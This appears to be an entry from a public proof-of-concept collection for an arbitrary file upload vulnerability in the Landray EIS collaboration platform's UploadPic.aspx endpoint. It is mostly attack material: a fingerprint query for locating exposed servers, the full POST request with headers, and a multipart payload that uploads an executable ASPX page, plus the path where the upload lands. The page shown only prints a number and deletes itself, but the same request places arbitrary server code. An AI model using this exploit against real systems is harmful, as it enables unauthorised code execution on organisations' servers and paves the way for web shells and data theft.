# 蓝凌EIS智慧协同平台UploadPic接口任意文件上传

- **系统**：蓝凌EIS智慧协同平台UploadPic接口　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="Landray 蓝凌 EIS智慧协同平台"`
- **请求**：`POST /HR/Ajax/UploadPic.aspx?KeyID=111 HTTP/1.1`
- **关键头**：`Content-Length: 252`　`Content-Type: multipart/form-data; boundary=----euhonhex6wmc4wev9lx3`

**请求体 / payload**
```
------euhonhex6wmc4wev9lx3
Content-Disposition: form-data; name="file";filename="0rnhunqnur.aspx"
<%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
------euhonhex6wmc4wev9lx3--

上传文件位置
/upload/20240129113859.aspx

\[蓝凌-EIS-uploadpic-任意文件上传.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 蓝凌 EIS智慧协同平台UploadPic接口任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌EIS智慧协同办公平台